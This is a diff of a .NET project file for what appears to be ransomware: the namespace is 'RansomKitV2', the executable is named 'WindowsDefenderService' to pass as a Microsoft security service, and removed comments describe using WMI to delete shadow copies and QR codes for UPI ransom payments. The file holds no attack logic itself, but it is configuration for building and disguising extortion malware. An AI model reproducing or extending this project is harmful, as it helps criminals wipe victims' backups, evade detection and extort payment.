@@ -1,24 +1,17 @@
 <Project Sdk="Microsoft.NET.Sdk">
-
   <PropertyGroup>
-    <OutputType>Exe</OutputType>
+    <OutputType>WinExe</OutputType>
     <TargetFramework>net8.0-windows</TargetFramework>
+    <UseWindowsForms>true</UseWindowsForms>
     <Nullable>enable</Nullable>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
     <Optimize>true</Optimize>
     <AssemblyName>WindowsDefenderService</AssemblyName>
     <RootNamespace>RansomKitV2</RootNamespace>
-    <!-- Single self-contained EXE:
-         dotnet publish -r win-x64 -p:PublishSingleFile=true -p:SelfContained=true -c Release -->
   </PropertyGroup>
-
   <ItemGroup>
-    <!-- WMI for shadow copy kill + process event watcher -->
-    <PackageReference Include="System.Management"         Version="8.0.0" />
-    <!-- ASCII QR code for UPI scanner -->
-    <PackageReference Include="QRCoder"                   Version="1.6.0" />
-    <!-- JSON state serialization -->
-    <PackageReference Include="System.Text.Json"          Version="8.0.5" />
+    <PackageReference Include="System.Management" Version="8.0.0" />
+    <PackageReference Include="QRCoder"            Version="1.6.0" />
+    <PackageReference Include="System.Text.Json"   Version="8.0.5" />
   </ItemGroup>
-
 </Project>
